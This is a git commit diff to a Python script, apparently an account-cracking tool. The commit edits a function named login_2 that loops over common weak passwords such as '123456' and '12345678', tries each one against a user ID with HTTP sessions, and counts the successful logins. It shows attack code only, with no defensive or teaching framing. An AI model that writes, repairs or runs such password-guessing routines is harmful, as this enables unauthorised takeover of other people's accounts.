a4a37406a07a51e674a498e2bef70207cab613e9
mrdanomallah007-sudo <mrdanomallah007@gmail.com>
2026-08-19 16:32:58 +0500

    Fix password list in login_2 function

--- Dano.py
+++ Dano.py
@@ -520,7 +520,7 @@ def login_1(uid):
 def login_2(uid):
     sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
-    for pw in ('123456', '123123', '1234567', '12345678', '123456789''):
+    for pw in ('123456', '123123', '123456', '1234567', '12345678', '123456789'):
         try:
             with requests.Session() as session:
                 headers = {
